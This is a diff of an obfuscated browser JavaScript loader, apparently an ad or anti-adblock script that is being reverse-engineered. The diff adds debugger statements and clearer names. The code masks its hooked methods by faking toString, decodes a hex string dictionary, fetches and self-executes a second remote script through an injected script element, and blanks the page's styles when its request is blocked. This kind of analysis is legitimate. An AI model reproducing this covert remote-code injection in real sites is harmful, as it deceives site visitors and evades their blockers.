@@ -7,6 +7,7 @@
 
         return paramsObject
     }
+
     function main() {
         function first_faker() {
             var d = DOCUMENT.getElementsByTagName("IMG");
@@ -44,14 +45,16 @@
             domElement[elementMethod].toString = to_string_mascarading
         }
 
-        function disableStylesBySlowPerformance(c) {
-            var b = WINDOW.performance.now() - c.start;
-            if (b < intValue300) {
+        function disableStylesByAjaxRequestTimeout(ajaxInstance) {
+            var executionTime = WINDOW.performance.now() - ajaxInstance.start;
+            debugger
+            if (executionTime < intValue300) {
                 disableDocumentStyles()
             }
         }
 
         function w(d, b, f) {
+            debugger
             WINDOW.Object.defineProperty(d, b, paramsObjectFactory("enumerable", false, "configurable", false, "writable", false, "value", f))
         }
 
@@ -64,43 +67,37 @@
 //                    elScript.src = "secondScript.js";
 //            debugger
             DOCUMENT.documentElement.appendChild(elScript);
-                    DOCUMENT.documentElement.removeChild(elScript)
+            // DOCUMENT.documentElement.removeChild(elScript)
         }
 
         function create_SelfExecutable_Script_With_Application_Tag(b) {
             //debugger
             var c = "mzs__" + WINDOW.Math.random().toString().substr(2, 4);
             WINDOW[c] = stateData;
-            b = "(function(mz_str) { debugger; " + b + "})('" + c + "');";
+            // b = "(function(mz_str) { debugger; " + b + "})('" + c + "');";
+            b = "(function(mz_str) {" + b + "})('" + c + "');";
             return b
         }
+
         function ajaxGetUri(ajaxUri, callbackFunction) {
             function onLoad() {
                 callbackFunction(ajaxRequest)
             }
+
             function onError() {
-                disableStylesBySlowPerformance(ajaxRequest)
-            }
-            window.logs(ajaxUri)
-            //      new window.XMLHttpRequest()
-            var ajaxRequest = new WINDOW.XMLHttpRequest();
-            // .open('GET', )
-            ajaxRequest.open("GET", ajaxUri, true);
-            // .responseType = 'text'
-            ajaxRequest.responseType = "text";
-            // .start = window.performance.now()
-            ajaxRequest.start = WINDOW.performance.now();
-            if (!main) {
-                main = "bind" //bind
+                disableStylesByAjaxRequestTimeout(ajaxRequest)
             }
 
-            // addEventListener
+            window.logs(ajaxUri)
+            var ajaxRequest = new WINDOW.XMLHttpRequest();
+            ajaxRequest.open("GET", ajaxUri, true);
+            ajaxRequest.responseType = "text";
+            ajaxRequest.start = WINDOW.performance.now();
             ajaxRequest.addEventListener("load", onLoad);
-            // addEventListener
             ajaxRequest.addEventListener("error", onError);
-            // .send(null)
             ajaxRequest.send(null)
         }
+
         function recode_encodedDict_in_loaded_script(scriptSource) {
             //debugger
             /**
@@ -139,7 +136,8 @@
 
                     var chars_to_recode = concatenated_encoded_elements.substr(h * 2, 2);
 
-                    var power_for_recoding_intChar_of_encoded_word_after_MX = WINDOW.parseInt(chars_to_recode, 16), chars_to_recode_as_int_copy = power_for_recoding_intChar_of_encoded_word_after_MX;
+                    var power_for_recoding_intChar_of_encoded_word_after_MX = WINDOW.parseInt(chars_to_recode, 16),
+                        chars_to_recode_as_int_copy = power_for_recoding_intChar_of_encoded_word_after_MX;
 
                     var recoded_word_after_MX = "";
 
@@ -186,6 +184,7 @@
                         new_element.removeEventListener("load", iframe_onload_listener)
                     }
                 }
+
                 // hack_documents_methods
                 //debugger
 
@@ -230,8 +229,13 @@
             var event_target = event.target;
             var targets_stack = (isError) ? stateData.er_load : stateData.sc_load;
             try {
-                window.logs({isError: isError, target: event_target.src || event_target.textContent || event_target.href})
-            } catch (e){}
+                window.logs({
+                    action: 'targets_stack.push(event_target)',
+                    event: isError ? 'error' : 'load',
+                    target: event_target.src || event_target.textContent || event_target.href
+                })
+            } catch (e) {
+            }
             targets_stack.push(event_target)
         }
 
@@ -246,6 +250,7 @@
                     //debugger
                     addAndRemoveScriptElement(recode_encodedDict_in_loaded_script(b.responseText))
                 }
+
                 if (ajaxResponse.status == 204) { // status
                     if (queryParamsObject.r) {
                         // console.log("arg load fail, 204")
@@ -263,7 +268,8 @@
 
                 if (!stateData.vars.session || !ajaxHeaderXLocation) {
                     return
-                };
+                }
+                ;
                 // debugger; // now we will request for second script
                 stateData.vars.proxy_host = ( new WINDOW.URL(ajaxHeaderXLocation)).host;
 
@@ -275,6 +281,7 @@
                 ajaxGetUri("https://sinoptik.ua/rc/ui/rc1/secondScript.js", secondScriptCallback)
                 //ajaxGetUri(ajaxHeaderXLocation, secondScriptCallback)
             }
+
             function makeQueryUri() {
                 var queryParamsArray = [];
                 for (queryParamName in queryParamsObject) {
@@ -301,14 +308,16 @@
             ajaxGetUri(makeQueryUri(), secondScriptRecieved)
 //                    ajaxGetUri("https://recreativ.ru/tizers.php?bn=WETPNH5v46", secondScriptRecieved)
         }
+
         function er_listen(event) {
             eventListener_error_load(event, true)
         }
+
         function sc_listen(event) {
             eventListener_error_load(event, false)
         }
 
-        window.logs = function(){
+        window.logs = function () {
             console.log(JSON.stringify(arguments, null, 2))
         }
 
@@ -353,6 +362,7 @@
             DOCUMENT.close()
         }
     }
+
     var encodedDictionary = [
         "494d47",
         "676574456c656d656e747342795461674e616d65",
@@ -387,4 +397,4 @@
 
     (main)()
 })()
-    /*21f5420b732442dfa1a830193ed3eb14da8b38a6*/
+/*21f5420b732442dfa1a830193ed3eb14da8b38a6*/
